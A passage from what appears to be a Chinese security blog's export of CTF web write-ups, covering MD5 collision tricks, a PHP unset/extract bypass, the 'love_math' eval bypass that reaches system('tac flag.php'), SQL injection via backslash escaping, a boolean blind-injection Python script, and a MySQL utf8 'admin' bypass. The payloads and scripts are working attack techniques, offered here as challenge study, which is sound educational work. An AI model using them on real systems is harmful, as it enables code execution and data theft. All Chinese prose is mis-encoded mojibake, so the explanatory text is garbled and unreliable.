&#125;?&gt; è¿™é‡Œæ˜¯md5å¼ºç¢°æ’ï¼Œåªéœ€è¦åˆ©ç”¨ ç”Ÿäº§md5å€¼ç›¸ç­‰çš„æ–‡ä»¶ python3 gen_coll_test.py æ³¨æ„ç”Ÿæˆçš„txtä»linuxä¸‹æ‹¿åˆ°windowsä¸‹æ–‡ä»¶ä¼šå˜åŒ–ï¼Œæ‰€ä»¥éœ€è¦åœ¨linuxä¸‹æ‰§è¡Œæœ€åçš„pyè„šæœ¬ã€‚ 123456789101112&gt; str5=open(&apos;./WEB/python-md5-collision/md5/out_test_001.txt&apos;,&apos;r&apos;).read()&gt; &gt; str6=open(&apos;./WEB/python-md5-collision/md5/out_test_002.txt&apos;,&apos;r&apos;).read()&gt; &gt; str7=open(&apos;./WEB/python-md5-collision/md5/out_test_003.txt&apos;,&apos;r&apos;).read()&gt; &gt; data = &#123;&gt; &apos;str5&apos;:str5,&gt; &apos;str6&apos;:str6,&gt; &apos;str7&apos;:str7,&gt; &#125;&gt; å¦ä¸ªå°é¢˜ 12345678910111213141516171819$a = $_POST[&apos;a&apos;];$b = $_POST[&apos;b&apos;1];$m = $_GET[&apos;m&apos;];$n = $_GET[&apos;n&apos;];if(!(ctype_upper($a)) || !is_numeric($b) || (strlen($b)&gt;6 )) &#123; die();&#125;if((strlen($m)&gt;4) || (strlen($n)&gt;4) )&#123; die();&#125;$str8 = hash(&apos;md5&apos;, $a, false);$str9 = strtr(hash(&apos;md5&apos;, $b, $false), $m, $n);echo &quot;&lt;p&gt;str8: $str8&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;str9: $str9&lt;/p&gt;&quot;;if(($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b)===6 ))&#123; echo $flag;&#125; bä¸º6ä½æ•°å­—ï¼Œaéœ€è¦å…¨å¤§å†™ï¼Œmd5å¼±ç¢°æ’ï¼ˆ0exxxxxï¼‰ aå¯ä»¥ä¸ºQNKCDZO ==&gt; 0e830400451993494058024219903391 å› ä¸ºhash(â€˜md5â€™, $a, false);è®¾ç½®äº†FALSE è¿”å›å°å†™16è¿›åˆ¶å­—ç¬¦ä¸² åˆ©ç”¨çˆ†ç ´ï¼Œbå¯ä»¥åœ¨100000-999999é—´ç”Ÿæˆï¼Œä½†æ˜¯æ— æ³•ä¿è¯0eåå…¨ä¸ºæ•°å­—ï¼Œæ°å¥½åé¢æœ‰ä¸€æ¬¡å¯¹mçš„æ›¿æ¢ï¼Œ ä¸ä¿¡æµ‹è¯•ä¸€ä¸‹ï¼Œ 12345678for i in range(0,1000000): tmp = md5(str(i).zfill(6)) if tmp[0:2]==&apos;0e&apos;: if &apos;d&apos; not in tmp: if &apos;e&apos; not in tmp: if &apos;f&apos; not in tmp: print i break å…‰æ˜¯defä¸å­˜åœ¨å°±ä»¥åŠæ‰¾ä¸åˆ°äº†ï¼Œè¿˜å¥½å­˜åœ¨ä¸€æ¬¡æ›¿æ¢ï¼Œåªéœ€è¦å°†defæ›¿æ¢æˆæ•°å­—å³å¯ strtr() å‡½æ•°è½¬æ¢å­—ç¬¦ä¸²ä¸­ç‰¹å®šçš„å­—ç¬¦ã€‚ æˆ‘ä»¬éœ€è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„ä¸‰ä¸ªå­—æ¯çš„æ•°å­— æœ‰ä¸ªå°å‘ï¼Œeä¸€å®šè¦åœ¨ï¼Œå¦åˆ™ç­‰ä¸‹0eé‡Œé¢çš„eè¢«æ›¿æ¢äº†ã€‚ã€‚ã€‚ğŸ˜‚ æ¯”å¦‚ 12345678for i in range(0,1000000): tmp = md5(str(i).zfill(6)) if tmp[0:2]==&apos;0e&apos;: if &apos;a&apos; not in tmp: if &apos;e&apos; not in tmp: if &apos;f&apos; not in tmp: print i break å¾—åˆ°066273 =&gt; 0e82202571963256679ccc61cb17d2c8 å°†bcdè½¬åŒ–ä¸ºæ•°å­—å³å¯ æ„é€  ?m=bcd&amp;n=123 post: a=QNKCDZO&amp;b=066273 ========================================================================== moctf-unset123456789101112131415161718192021222324252627282930313233&lt;?php highlight_file(&apos;index.php&apos;); function waf($a)&#123; foreach($a as $key =&gt; $value)&#123; if(preg_match(&apos;/flag/i&apos;,$key))&#123; exit(&apos;are you a hacker&apos;); &#125; &#125; &#125; foreach(array(&apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125; &#125; if($_POST) &#123; waf($_POST);&#125; if($_GET) &#123; waf($_GET); &#125; if($_COOKIE) &#123; waf($_COOKIE);&#125; if($_POST) extract($_POST, EXTR_SKIP); if($_GET) extract($_GET, EXTR_SKIP); if(isset($_GET[&apos;flag&apos;]))&#123; if($_GET[&apos;flag&apos;] === $_GET[&apos;daiker&apos;])&#123; exit(&apos;error&apos;); &#125; if(md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;daiker&apos;]))&#123; include($_GET[&apos;file&apos;]); &#125; &#125;?&gt; ä»£ç æ‰§è¡Œé¡ºåºæ˜¯unset-&gt;waf-&gt;extract æ„é€  ?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=flag.txt post: _GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=flag.txt å¯¹äºunsetï¼Œ 1234567891011121314151617_POSTçš„å€¼ä¸ºï¼Œå³$__Rarray (size=1) &apos;_GET&apos; =&gt; array (size=3) &apos;flag&apos; =&gt; string &apos;QNKCDZO&apos; (length=7) &apos;daiker&apos; =&gt; string &apos;s878926199a&apos; (length=11) &apos;file&apos; =&gt; string &apos;flag.txt&apos; (length=8)$__kä¸º_GET$__vä¸ºarray (size=3) &apos;flag&apos; =&gt; string &apos;QNKCDZO&apos; (length=7) &apos;daiker&apos; =&gt; string &apos;s878926199a&apos; (length=11) &apos;file&apos; =&gt; string &apos;flag.txt&apos; (length=8)$$_kä¸º$_GETå³GETä¼ å‚çš„å€¼$$__k == $__væˆç«‹æ‰€ä»¥ æˆ‘ä»¬çš„è¶…å…¨å±€å˜é‡ $_GETå°±è¿™ä¹ˆåä¸½ä¸½çš„è¢«unsetäº† ç»•è¿‡waf extract($_POST, EXTR_SKIP); EXTR_SKIP å¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ å› ä¸ºä»¥åŠè¢«unsetï¼Œæ‰€ä»¥å¯ä»¥å˜é‡å¯ä»¥å¯¼å…¥,æ ¹æ®é¡ºåºï¼Œè¿™é‡Œåº”è¯¥ç”¨çš„æ˜¯_POSTä¸­ä¼ çš„å€¼ ========================================================================== 2019å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨å¤§èµ›-love_math å›½èµ›çš„é¢˜ï¼Œå½“æ—¶æ²¡åšå‡ºæ¥ï¼Œè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ğŸ˜€ 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&apos;c&apos;]))&#123; show_source(__FILE__);&#125;else&#123; //ä¾‹å­ c=20-1 $content = $_GET[&apos;c&apos;]; if (strlen($content) &gt;= 80) &#123; die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); &#125; $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); &#125; &#125; //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;]; preg_match_all(&apos;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&apos;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); &#125; &#125; //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(&apos;echo &apos;.$content.&apos;;&apos;);&#125; base_convert() å¯ä»¥ä»»æ„è¿›åˆ¶è½¬æ¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸º 36 è¿›åˆ¶æ•°ï¼Œè¿™æ · a~z æˆ‘ä»¬å°±éƒ½å¯ä»¥ç”¨äº†ã€‚ ä¸€ä¸ªåœ¨çº¿è½¬è¿›åˆ¶çš„ç½‘ç«™http://www.atool9.com/hexconvert.php æ„é€  payload è¯•è¯•ã€‚è®¿é—® /calc.php?c=base_convert(55490343972,10,36)() æ„é€  1system(`ls`) base_convert(1751504350,10,36)(base_convert(784,10,36)) ä½†æ˜¯å¦‚æœè¦ç”¨åˆ°ç¬¦å·ï¼Œå› ä¸ºä¸èƒ½æœ‰å­—æ¯ï¼Œæœ€åéœ€è¦è½¬æˆ10è¿›åˆ¶ï¼Œå­—ç¬¦ä¸²å…ˆè½¬æˆ16è¿›åˆ¶ 123hexdec(bin2hex(&apos;ls *&apos;));=&gt;1819684202base_convert(37907361743,10,36)(dechex(1819484202)) æˆäº†ï¼Œé‚£ç»§ç»­ç ”ç©¶æ€ä¹ˆç»•è¿‡é•¿åº¦é™åˆ¶å§ã€‚è¿™é‡Œçš„æ€è·¯ï¼Œå°±æ˜¯å…ˆæ‹¿åˆ° _GETï¼Œç„¶åç”¨é‡Œé¢çš„å‚æ•°æ¥ä½œä¸ºå‡½æ•°çš„åå­—ï¼ˆè¿™é‡Œè¦è¯»æ–‡ä»¶ï¼Œå°±æ˜¯ file_get_contents äº†ï¼‰å’Œå‚æ•°ï¼ˆæ–‡ä»¶è·¯å¾„ï¼‰äº†ã€‚ hex2bin()è§£ç åå…­è¿›åˆ¶ç¼–ç çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ dechex()åè¿›åˆ¶åˆ°åå…­è¿›åˆ¶ æ¯”å¦‚æˆ‘ä»¬è¦_GET echo base_convert(â€˜hex2binâ€™,36,10) =&gt; 37907361743 echo hexdec(hexdec(bin2hex(â€˜_GETâ€™))) =&gt; 1598506324 12345?$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php=&gt;?$pi=hex2bin(5f474554)ç›¸å½“äº$pi=_GET;($_GET[pi])($_GET[abs]) è¿™é‡Œæœ‰ç”¨åˆ°ä¸€ä¸ªtrickï¼Œå°±æ˜¯ä½¿ç”¨ {} æ¥ä»£æ›¿ [] è¿›è¡Œæ•°ç»„ç´¢å¼• https://www.php.net/manual/en/language.types.array.php#language.types.array.syntax.accessing ========================================================================== å‚è€ƒé“¾æ¥ï¼šhttp://www.secevery.com:4321/bugs/wooyun-2014-063895 https://www.ctfwp.com/articals/2019national.html#lovemath https://mochazz.github.io/2019/04/22/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/#love-math","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"sql-è½¬ç§»å­—ç¬¦ç»•è¿‡","slug":"sql-è½¬ä¹‰å­—ç¬¦ç»•è¿‡","date":"2019-08-16T03:11:31.000Z","updated":"2019-08-22T13:46:20.047Z","comments":true,"path":"2019/08/16/sql-è½¬ä¹‰å­—ç¬¦ç»•è¿‡/","link":"","permalink":"http://yoursite.com/2019/08/16/sql-è½¬ä¹‰å­—ç¬¦ç»•è¿‡/","excerpt":"å¦ä¸€é¢˜sqlæ³¨å…¥ï¼Œè®°å½•ä¸€ä¸‹ğŸ˜ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"å¦ä¸€é¢˜sqlæ³¨å…¥ï¼Œè®°å½•ä¸€ä¸‹ğŸ˜ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 123456789101112131415161718192021222324252627282930&lt;?php $flag=&quot;flag&#123;hahahaha&#125;&quot;; $con = mysql_connect(&quot;localhost:3306&quot;,&quot;root&quot;,&quot;root&quot;); if (!$con)&#123; die(&apos;Could not connect: &apos; . mysql_error()); &#125; $db=&quot;cgctf&quot;; mysql_select_db($db, $con); function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES); &#125; $username = @clean((string)$_GET[&apos;username&apos;]); $password = @clean((string)$_GET[&apos;password&apos;]); echo $username.&quot;&lt;br&gt;&quot;; echo $password.&quot;&lt;br&gt;&quot;; $query=&apos;SELECT * FROM users WHERE name=\\&apos;&apos;.$username.&apos;\\&apos; AND pass=\\&apos;&apos;.$password.&apos;\\&apos;;&apos;; echo $query; $result=mysql_query($query); echo $result.&quot;&lt;br&gt;&quot;; echo mysql_num_rows($result); if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;); &#125; echo $flag;?&gt; emmmæ€è·¯ stripslashes()åå¼•ç”¨ä¸€ä¸ªå¼•ç”¨å­—ç¬¦ä¸²ã€‚ 12&gt; è¿”å›ä¸€ä¸ªå»é™¤è½¬ä¹‰åæ–œçº¿åçš„å­—ç¬¦ä¸²ï¼ˆ\\&apos; è½¬æ¢ä¸º &apos; ç­‰ç­‰ï¼‰ã€‚åŒåæ–œçº¿ï¼ˆ\\\\ï¼‰è¢«è½¬æ¢ä¸ºå•ä¸ªåæ–œçº¿ï¼ˆ\\ï¼‰ã€‚&gt; Note: å¦‚æœ magic_quotes_sybase é¡¹å¼€å¯ï¼Œåæ–œçº¿å°†è¢«å»é™¤ï¼Œä½†æ˜¯ä¸¤ä¸ªåæ–œçº¿å°†ä¼šè¢«æ›¿æ¢æˆä¸€ä¸ªã€‚ htmlentities($str, ENT_QUOTES); htmlentities â€” å°†å­—ç¬¦è½¬æ¢ä¸º HTML è½¬ä¹‰å­—ç¬¦ ENT_QUOTES æ—¢è½¬æ¢åŒå¼•å·ä¹Ÿè½¬æ¢å•å¼•å·ã€‚ ä»£ç ä¸­clean()å‡½æ•°å»æ‰è½¬ä¹‰ï¼Œhtmlentities($str, ENT_QUOTES)ä¼šè½¬æ¢å•å¼•å·å’ŒåŒå¼•å·ã€‚ 123456function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES); &#125; ç»“åˆsqlè¯­å¥ 1SELECT * FROM users WHERE name=&apos;gg&apos; AND pass=&apos;gg&apos;; å…¶ä¸­ggæ˜¯æˆ‘å¡«å…¥çš„å˜é‡ æ‰€ä»¥ç›´æ¥æ„é€  123username=\\&amp;password=or 1#==&gt;SELECT * FROM users WHERE name=&apos;\\&apos; AND pass=&apos; or 1#&apos;;","categories":[],"tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://yoursite.com/tags/sqlæ³¨å…¥/"}]},{"title":"ä¸€é“sqlæ³¨å…¥é¢˜","slug":"ä¸€é“sqlæ³¨å…¥é¢˜","date":"2019-08-16T03:02:28.000Z","updated":"2019-08-22T13:47:16.082Z","comments":true,"path":"2019/08/16/ä¸€é“sqlæ³¨å…¥é¢˜/","link":"","permalink":"http://yoursite.com/2019/08/16/ä¸€é“sqlæ³¨å…¥é¢˜/","excerpt":"æ—©ä¸Šçœ‹åˆ°ä¸€é¢˜sqlæ³¨å…¥ï¼Œåæ­£æ²¡å•¥äº‹ï¼Œå°±åšä¸€ä¸‹ğŸ˜Š 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"æ—©ä¸Šçœ‹åˆ°ä¸€é¢˜sqlæ³¨å…¥ï¼Œåæ­£æ²¡å•¥äº‹ï¼Œå°±åšä¸€ä¸‹ğŸ˜Š 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; #### 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php include(&quot;config.php&quot;); $conn -&gt;query(&quot;set names utf8&quot;); function randStr($lenth=32)&#123; $strBase = &quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;; $str = &quot;&quot;; while($lenth&gt;0)&#123; $str.=substr($strBase,rand(0,strlen($strBase)-1),1); $lenth --; &#125; return $str; &#125; if($install)&#123; $sql = &quot;create table `user` ( `id` int(10) unsigned NOT NULL PRIMARY KEY AUTO_INCREMENT , `username` varchar(30) NOT NULL, `passwd` varchar(32) NOT NULL, `role` varchar(30) NOT NULL )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;; if($conn-&gt;query($sql))&#123; $sql = &quot;insert into `user`(`username`,`passwd`,`role`) values (&apos;admin&apos;,&apos;&quot;.md5(randStr()).&quot;&apos;,&apos;admin&apos;)&quot;; $conn -&gt; query($sql); &#125; &#125; function filter($str)&#123; $filter = &quot;/ |\\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\\||`|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot;; if(preg_match($filter,$str))&#123; die(&quot;you can&apos;t input this illegal char!&quot;); &#125; return $str; &#125; function show($username)&#123; global $conn; $sql = &quot;select role from `user` where username =&apos;&quot;.$username.&quot;&apos;&quot;; $res = $conn -&gt;query($sql); if($res-&gt;num_rows&gt;0)&#123; echo &quot;$username is &quot;.$res-&gt;fetch_assoc()[&apos;role&apos;]; &#125;else&#123; die(&quot;Don&apos;t have this user!&quot;); &#125; &#125; function login($username,$passwd)&#123; global $conn; global $flag; $username = trim(strtolower($username)); $passwd = trim(strtolower($passwd)); if($username == &apos;admin&apos;)&#123; die(&quot;you can&apos;t login this as admin!&quot;); &#125; $sql = &quot;select * from `user` where username=&apos;&quot;.$conn-&gt;escape_string($username).&quot;&apos; and passwd=&apos;&quot;.$conn-&gt;escape_string($passwd).&quot;&apos;&quot;; $res = $conn -&gt;query($sql); if($res-&gt;num_rows&gt;0)&#123; if($res-&gt;fetch_assoc()[&apos;role&apos;] === &apos;admin&apos;) exit($flag); &#125;else&#123; echo &quot;sorry,username or passwd error!&quot;; &#125; &#125; function source()&#123; highlight_file(__FILE__); &#125; $username = isset($_POST[&apos;username&apos;])?filter($_POST[&apos;username&apos;]):&quot;&quot;; $passwd = isset($_POST[&apos;passwd&apos;])?filter($_POST[&apos;passwd&apos;]):&quot;&quot;; $action = isset($_GET[&apos;action&apos;])?filter($_GET[&apos;action&apos;]):&quot;source&quot;; switch($action)&#123; case &quot;source&quot;: source(); break ; case &quot;login&quot; : login($username,$passwd);break; case &quot;show&quot; : show($username);break; &#125; 1234567891011121314151617&gt; function sql_clean($str)&#123;&gt; if(is_array($str))&#123;&gt; echo &quot;&lt;script&gt; alert(&apos;not array!!@_@&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;exit;&gt; &#125;&gt; $filter = &quot;/ |\\*|#|,|union|like|regexp|for|and|or|file|--|\\||`|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot;; &gt; &gt; //ç”±äºåœ¨mysqlä¸­è®¤ä¸º %a0 ä¹Ÿæ˜¯ç©ºæ ¼,æ‰€ä»¥è¿™é‡Œä¹Ÿéœ€è¦è¿‡æ»¤, &gt; //åœ¨è¿™é‡Œåšäº†ä¿®æ”¹,æ·»åŠ  %a0&gt; &gt; if(preg_match($filter,$str))&#123;&gt; echo &quot;&lt;script&gt; alert(&apos;illegal character!!@_@&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;exit;&gt; &#125;else if(strrpos($str,urldecode(&quot;%00&quot;)))&#123;&gt; echo &quot;&lt;script&gt; alert(&apos;illegal character!!@_@&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;exit;&gt; &#125;&gt; return $this-&gt;str=$str;&gt; &#125;&gt; è¿™é‡Œæ˜¯è¿‡æ»¤å‡½æ•°ï¼Œåˆ©ç”¨bpè·‘ä¸€ä¸‹è¿˜å‰©ä¸‹ä»€ä¹ˆ ! â€œâ€ % â€˜ - . / : &lt; = &gt; ? @ [] \\ ^ _ {} ~ $ () + è‡³äºè¿‡æ»¤%0aã€a0ç­‰ï¼Œæ˜¯å› ä¸º%0aåœ¨mysqlå¯ä»¥ä»£è¡¨ç©ºæ ¼ è§‚å¯Ÿsqlè¯­å¥ï¼Œéœ€è¦æ»¡è¶³è¿”å›ç»“æœå¤§äº0ï¼Œå¹¶ä¸”roleä¸ºadmin show()ï¼Œéœ€è¦ç»“æœé›†å¤§äº0ï¼Œè¿”å›ç¬¬ä¸€è¡Œçš„role 1$sql = &quot;select role from `user` where username =&apos;&quot;.$username.&quot;&apos;&quot;; login() 1$sql = &quot;select * from `user` where username=&apos;&quot;.$conn-&gt;escape_string($username).&quot;&apos; and passwd=&apos;&quot;.$conn-&gt;escape_string($passwd).&quot;&apos;&quot;; escape_stringï¼ˆï¼‰ åœ¨ä»¥ä¸‹å­—ç¬¦å‰æ·»åŠ åæ–œæ : \\x00, \\n, \\r, , â€˜, â€œ å’Œ \\x1a login()å› ä¸ºå­˜åœ¨escape_stringï¼ˆï¼‰æ— æ³•ç»•è¿‡å•å¼•å·ï¼Œåªèƒ½ä»showå…¥æ‰‹ æ€è·¯unionè¢«è¿‡æ»¤ï¼Œæ²¡æœ‰æŠ¥é”™å›æ˜¾ï¼Œè€ƒè™‘å¸ƒå°”ç›²æ³¨ mysqlä¸­çš„è¿ç®—é¡ºåºï¼ˆä»ä¸‹åˆ°ä¸Šä¼˜å…ˆçº§å˜é«˜ï¼‰ ç›´æ¥æ„é€  123select role from `user` where username =&apos;&apos;+1=&apos;0&apos;select role from `user` where username =&apos;&apos;+0=&apos;0&apos;å›æ˜¾ä¸åŒnice ç¬¬ä¸€æ­¥ï¼Œå˜ä¸º where username =â€™1â€™=â€™0â€™ ç¬¬äºŒæ­¥ï¼Œå˜ä¸ºwhere 0=â€™0â€™ ç¬¬ä¸‰æ­¥ï¼Œå˜ä¸ºwhere 1 é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ 12345select role from `user` where username =&apos;&apos;^&apos;1&apos;=&apos;0&apos;select role from `user` where username =&apos;&apos;^!&apos;1&apos;=&apos;1&apos; //æˆ–è€…ç”¨!select role from `user` where username =&apos;&apos;-!1=&apos;1&apos;select role from `user` where username =&apos;&apos;%&apos;1&apos;=&apos;1&apos;select role from `user` where username =&apos;&apos;&lt;&apos;1&apos;=&apos;1&apos; wpé‡Œè¿˜æœ‰å¥é¢˜å¤–è¯ select ~â€™18446744073709551615â€™; å€¼ä¸º0ï¼Œ~ä¸ºå–å å†™ä¸ªè„šæœ¬ï¼Œå› ä¸ºè¡¨çš„ç»“æ„ä»¥åŠç»™å‡ºï¼Œ 12345678910111213141516171819202122232425262728# coding=utf-8import requestsurl = &quot;http://127.0.0.1/web4/index.php?action=show&quot;flag = &quot;&quot;tmp = 0passwd = &quot;&quot;for i in range(-1,-100,-1): if tmp == 1: break tmp = 1 for j in range(33,127): payload=&apos;select(passwd)from(user)&apos; id = &quot;&apos;+(mid((&quot;+payload+&quot;)FROM(&#123;i&#125;))=&apos;&#123;flag&#125;&apos;)=&apos;0&quot;.format(i=str(i),flag=chr(j)+flag) print(id) data = &#123; &quot;username&quot;:id, &apos;passwd&apos;:&apos;1&apos; &#125; r=requests.post(url=url,data=data) #print(r.content) if &quot;admin&quot; in r.content.decode(&quot;utf-8&quot;): tmp = 0 flag=chr(j)+flag print(flag) breakprint(flag) ä¸­é—´é‡åˆ°ä¸ªå‘ï¼Œforè¢«è¿‡æ»¤ï¼Œåªèƒ½ç”¨midçš„fromï¼Œå› ä¸ºä¸çŸ¥é“é•¿åº¦ï¼Œå¯ä»¥åˆ©ç”¨è´Ÿæ•°åˆ¤æ–­ 1234if($username == &apos;admin&apos;)&#123;if($res-&gt;fetch_assoc()[&apos;role&apos;] === &apos;admin&apos;) exit($flag); è·å–flagéœ€è¦ä»login()å‡½æ•°ï¼Œè¦æ±‚ä¼ å…¥çš„usernameä¸ä¸ºadminï¼Œä½†æ˜¯è¦æ±‚æ•°æ®åº“è·å–çš„æ•°æ®roleåˆæ˜¯adminï¼Œè¿™é‡Œåˆ©ç”¨mysqlçš„utf-8å­—ç¬¦ç¼–ç é—®é¢˜,ç»•è¿‡å¯¹adminçš„åˆ¤æ–­ ä»¥åçœ‹åˆ°ä¸‹é¢çš„è¯­å¥å°±å¯ä»¥è”æƒ³åˆ°mysqlçš„utf-8å­—ç¬¦ç¼–ç é—®é¢˜ 1$conn -&gt;query(&quot;set names utf8&quot;); åªéœ€è¦æ„é€ ?username=admin%0cå³å¯ç»•è¿‡ï¼Œ é€ æˆè¿™ä¸ªTrickçš„æ ¹æœ¬åŸå› æ˜¯ï¼ŒMysqlå­—æ®µçš„å­—ç¬¦é›†å’Œphp mysqliå®¢æˆ·ç«¯è®¾ç½®çš„å­—ç¬¦é›†ä¸ç›¸åŒã€‚ å‚è€ƒé“¾æ¥ï¼šhttps://github.com/wonderkun/CTF_web/tree/master/web300-2 https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html","categories":[],"tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://yoursite.com/tags/sqlæ³¨å…¥/"}]},{"title":"codebreaking-5","slug":"codebreaking-5","date":"2019-08-15T01:00:44.000Z","updated":"2019-08-22T13:46:36.691Z","comments":true,"path":"2019/08/15/codebreaking-5/","link":"","permalink":"http://yoursite.com/2019/08/15/codebreaking-5/","excerpt":"è¿˜æœ‰åŠå°æ—¶ï¼Œå†åˆ·äº¿é¢˜ğŸ˜€ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"è¿˜æœ‰åŠå°æ—¶ï¼Œå†åˆ·äº¿é¢˜ğŸ˜€ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; easy-nodechr æœ¬åœ°windowsæ­å»ºç¯å¢ƒ 12&gt; node index.js&gt; Error: Cannot find module â€˜koaâ€™ 12&gt; npm install koa&gt; ====== å®‰è£…äº†å¾ˆå¤šmodule ä¾èµ–å…¨éƒ¨å®‰è£…æˆåŠŸåè¿˜æ˜¯å¯åŠ¨ä¸äº†ï¼Œç”¨dockerå¯åŠ¨ 12&gt; docker-compose up -d --build&gt; 123456789101112131415161718192021222324252627282930function safeKeyword(keyword) &#123; if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\\-\\-)/is)) &#123; return keyword &#125; return undefined&#125;async function login(ctx, next) &#123; if(ctx.method == &apos;POST&apos;) &#123; let username = safeKeyword(ctx.request.body[&apos;username&apos;]) let password = safeKeyword(ctx.request.body[&apos;password&apos;]) let jump = ctx.router.url(&apos;login&apos;) if (username &amp;&amp; password) &#123; let user = await ctx.db.get(`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &apos;$&#123;username.toUpperCase()&#125;&apos; AND &quot;password&quot; = 